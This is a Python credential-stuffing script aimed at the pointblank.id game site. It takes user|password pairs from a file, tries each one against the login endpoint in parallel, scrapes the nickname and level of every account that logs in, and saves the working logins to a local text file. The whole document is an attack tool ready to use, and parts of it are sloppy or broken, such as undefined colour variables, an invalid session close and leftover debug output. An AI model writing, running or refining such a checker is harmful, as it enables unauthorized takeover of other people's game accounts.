import requests, os, sys
from multiprocessing.pool import ThreadPool 
from bs4 import BeautifulSoup 
 

login_url = "https://www.pointblank.id/login/process" 
repos_url = "https://www.pointblank.id/game/profile"
 
with requests.session() as s: 	
    def cek(up):
            try:
                res=s.post('https://www.pointblank.id/login/process',data={'loginFail':'0','userid':up.split('|')[0],'password':up.split('|')[1]})
                if 'tidak sesuai' in res.text:
                    print(up,'salah')
                else:
                    r = s.get(repos_url)
                    soup = BeautifulSoup (r.content, "html.parser")
                    repos = soup.find("p", class_="level")
                    print(up,'benar')
                    usernameDiv = soup.find("div", class_="nick")
                    print("Username: " + usernameDiv.getText())
                    username = usernameDiv.getText()
                    repos = soup.find("p", class_="level")
                    print("Username: " + repos.getText())
                    reposs=repos.getText()
                    if repos is None:
                          print("akun belum di aktifkan")
                          print(repos)

                          s.session.close()
                    else:
                          open('bang2.txt','a+').write(up+'|'+reposs+'|'+ username+'\n')
                          s.session.close()

            except:
                pass

try:
	os.system('clear')

	ThreadPool(2).map(cek,open(sys.argv[1]).read().splitlines())
	print ("Hello, World!")
except requests.exceptions.ConnectionError:
	exit('%s[%s!%s] %sCheck internet')
except IndexError:
	exit('%s[%s!%s] %sUse : python2 %s target.txt \n%s[%s!%s] %sFill in target.txt as follows user-id|password'%(W1,R1,W1,W0,sys.argv[0],W1,R1,W1,W0))
except IOError:
	exit('%s[%s!%s] %sFile does not exist')
except KeyboardInterrupt:
	exit('\n%s[%s!%s] %sExit'%())
